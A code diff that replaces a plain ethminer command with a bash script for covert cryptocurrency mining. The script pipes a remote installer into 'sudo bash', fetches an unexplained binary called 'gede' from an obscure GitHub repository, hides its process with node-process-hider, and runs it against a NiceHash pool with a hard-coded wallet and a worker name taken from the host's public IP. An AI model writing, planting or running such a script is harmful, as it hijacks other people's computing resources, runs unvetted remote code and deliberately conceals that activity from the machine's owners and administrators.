@@ -1,2 +1,20 @@
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz && tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz 
-&& bin/ethminer -P stratum2+tcp://3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.tester1@144.217.82.15:80
+#!/bin/bash
+
+POOL=144.217.82.15:80
+
+WALLET=3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX
+
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
+
+cd "$(dirname "$0")"
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+apt-get install screen -y
+npm i -g node-process-hider
+wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
+sudo ph add gede
+chmod +x ./gede
+./gede --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY
+
+echo success
